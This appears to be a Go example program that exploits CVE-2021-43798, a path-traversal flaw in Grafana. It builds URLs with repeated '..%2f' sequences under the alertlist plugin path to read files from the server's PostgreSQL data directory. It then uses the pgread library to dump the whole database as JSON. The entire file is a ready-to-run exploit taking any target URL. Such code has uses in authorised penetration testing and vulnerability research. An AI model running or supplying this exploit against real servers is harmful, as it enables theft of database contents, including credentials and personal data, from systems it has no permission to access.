package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/Chocapikk/pgread/pgdump"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: exploit <grafana-url>")
		os.Exit(1)
	}

	// CVE-2021-43798: Grafana path traversal
	reader := grafanaReader(os.Args[1], "/var/lib/postgresql/data")

	// Full dump with all options
	result, _ := pgdump.RemoteDump(reader, nil) // nil = default options (everything)

	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	enc.Encode(result)
}

func grafanaReader(target, pgdata string) pgdump.RemoteReader {
	base := strings.TrimSuffix(target, "/")
	traversal := strings.Repeat("..%2f", 9)

	return func(path string) ([]byte, error) {
		url := base + "/public/plugins/alertlist/" + traversal + pgdata + "/" + path
		resp, err := http.Get(url)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		if resp.StatusCode != 200 {
			return nil, fmt.Errorf("%d", resp.StatusCode)
		}
		return io.ReadAll(resp.Body)
	}
}
